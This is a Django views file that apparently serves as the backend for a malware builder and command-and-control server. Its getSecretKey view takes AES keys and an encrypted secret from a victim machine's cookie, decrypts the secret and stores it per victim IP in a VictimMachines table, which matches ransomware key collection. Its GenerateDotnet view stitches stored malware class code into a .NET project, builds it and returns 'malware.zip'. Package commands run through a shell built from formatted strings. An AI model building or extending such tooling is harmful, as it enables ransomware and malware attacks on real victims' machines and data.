from pydoc import plain
from django.http.response import HttpResponse
from django.shortcuts import render
import os
import re
import subprocess
from rest_framework.decorators import api_view, permission_classes
from rest_framework.response import Response
from rest_framework import status
import json
from .models import ClassCode,VictimMachines
from Crypto.Cipher import AES
# Create your views here.
"""
@api_view(["POST"])
def Analyzer(request):
    data = json.loads(request.body.decode("utf-8"))
    folder = data["folder"]
    dotnets = []
    files = [f for f in os.listdir(folder) if f.endswith(".exe")]
    print("------------------------------------------------------------------")
    for file in files:
        stream = os.popen(".\\Scripts\\diec.exe -d {}".format(folder + "\\" + file))
        output = stream.readlines()
        for o in output:
            print(o, end="")
            if "library: .NET" in o:
                dotnets.append(file)
        os.popen(".\\Scripts\\diec.exe -e {}".format(folder + "\\" + file))
        print("------------------------------------------------------------------\n")
    for dotnet in dotnets:
        malware = Malware.objects.create(name=dotnet)
        stream = os.popen(".\\Scripts\\diec.exe -e {}".format(folder + "\\" + file))
        output = stream.readlines()
        print(dotnet)
        for line in output[1:]:
            print(line)
            entropy = line.split("|")
            EntropySection.objects.create(
                malware=malware,
                name=entropy[1],
                offset=entropy[2],
                size=entropy[3],
                entropy=float(entropy[4].split(" ")[0][:-1]),
                status=entropy[4].split(" ")[1],
            )
        proc = subprocess.Popen(
            ["powershell", ".\Scripts\Demo.ps1 {}".format(folder + "\\" + dotnet)],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        lines = proc.stdout.read().decode("utf-8")
        classes = re.split("@class@", lines)
        for c in classes:
            ClassCode.objects.create(malware=malware, code=c)
    return Response(status=status.HTTP_200_OK)
"""

@api_view(["GET"])
def getSecretKey(request):
    cookie = request.headers.get("Cookie")
    secret_key_2 = cookie.split("&")

    secret_key_array = []
    aes_key_array = []
    iv_array = []

    counter = 0
    int_string = ""
    for i in range(len(cookie)):
        if(cookie[i].isdigit()):
            int_string = int_string + cookie[i] 
        else:
            if(int_string != ""):
                int_string = int(int_string)
            else:
                counter = counter + 1
            if(counter == 1):
                secret_key_array.append(int_string)
            elif(counter == 2):
                aes_key_array.append(int_string)
            elif(counter == 3):
                iv_array.append(int_string)
            int_string = ""



    secret_key_array.pop(0)
    iv_array.pop(0)
    aes_key_array.pop(0)
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip_address = x_forwarded_for.split(',')[0]
    else:
        ip_address = request.META.get('REMOTE_ADDR')

    secret_key = bytes(secret_key_array)
    aes_key = bytes(aes_key_array)
    iv = bytes(iv_array)

    aes = AES.new(aes_key, AES.MODE_CBC, iv=iv)
    plaintext = aes.decrypt(secret_key).decode("utf-8")[:8]
    print(plaintext)
    if VictimMachines.objects.filter(ip_address=ip_address).exists():
        victim = VictimMachines.objects.get(ip_address=ip_address)
        victim.aes_communnication_iv = str(iv)
        victim.aes_communnication_key = str(aes_key)
        victim.encryption_secret_key = plaintext
        victim.save()
    else:
        VictimMachines.objects.create(
            ip_address=ip_address,
            aes_communnication_key=str(aes_key),
            aes_communnication_iv=str(iv),
            encryption_secret_key=plaintext
        )
         
    return Response(status=status.HTTP_200_OK)


import shutil


csprojTemplate = '<Project Sdk="Microsoft.NET.Sdk">\n\t<PropertyGroup>\n\t<OutputType>Exe</OutputType>\n\t\t<TargetFramework>net5.0</TargetFramework>\n\t</PropertyGroup>\n</Project>'
csprojTemplateFramework = '<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><OutputType>Exe</OutputType><TargetFramework>netframework4.8</TargetFramework></PropertyGroup></Project>'
from django.http import FileResponse

dotnet = "netframework4.8"


@api_view(["POST"])
def GenerateDotnet(request):
    sources = []
    data = request.data
    print(data)
    for module in data["modules"]:
        source = ClassCode.objects.get(id=module["id"])
        sources.append(source)
    path = ".\\Scripts\\DotnetProject"
    i = 1

    for fname in os.listdir(path):
        if fname.startswith("source"):
            os.remove(os.path.join(path, fname))
    f = open(os.path.join(path, "DotnetProject.csproj"), "w")
    f.write(csprojTemplateFramework)
    f.close()

    for source in sources:
        f2 = open(os.path.join(path, "source{}.cs".format(i)), "w", encoding="utf-8")
        code = source.code.replace("\n","")
        f2.write(code)
        f2.close()
        i += 1
        for package in source.packageDependincies.all():
            proc = subprocess.Popen(
                "dotnet add package {}".format(package.package),
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=path,
            )
            stdout, stderr = proc.communicate()
            if proc.returncode != 0:
                print(stdout.decode("utf-8", "replace"))
                return Response(status=status.HTTP_400_BAD_REQUEST)
        for reference in source.referenceDependincies.all():
            proc = subprocess.Popen(
                "dotnet add reference ..\Libraries\{}".format(reference.package),
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=path,
            )
            stdout, stderr = proc.communicate()
            if proc.returncode != 0:
                print(stdout.decode("utf-8", "replace"))
                return Response(status=status.HTTP_400_BAD_REQUEST)

    command = "dotnet build --configuration Release"
    proc = subprocess.Popen(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        cwd=path,
    )
    stdout, stderr = proc.communicate()
    if proc.returncode != 0:
        print(stdout.decode("utf-8", "replace"))
        return Response(status=status.HTTP_400_BAD_REQUEST)
    malware_path = os.path.join(path, "bin\\Release\\{}".format(dotnet))
    shutil.make_archive("malware", "zip", malware_path)
    zip_file = open("malware.zip", "rb")
    response = FileResponse(zip_file)
    return response
